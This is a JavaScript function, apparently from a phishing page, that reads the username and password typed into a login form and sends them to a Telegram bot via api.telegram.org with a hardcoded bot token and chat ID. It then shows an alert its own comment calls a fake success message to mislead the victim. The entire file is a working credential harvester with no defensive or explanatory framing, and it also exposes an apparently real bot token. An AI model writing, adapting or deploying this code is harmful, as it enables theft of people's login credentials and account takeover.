function sendToTelegram() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const botToken = "7404971376:AAH_E3_8Xof0khT8bBzgJwBg8EwhEeUlR4s"; // Replace with your Telegram bot token
    const chatId = "8183479741";     // Replace with your Telegram chat ID
    const message = `🔐 Login Info:\n📧 Username: ${username}\n🔑 Password: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Message sent to Telegram", data);
        alert("Logging in..."); // Fake success message
    })
    .catch(error => {
        console.error("Error sending message", error);
    });
}
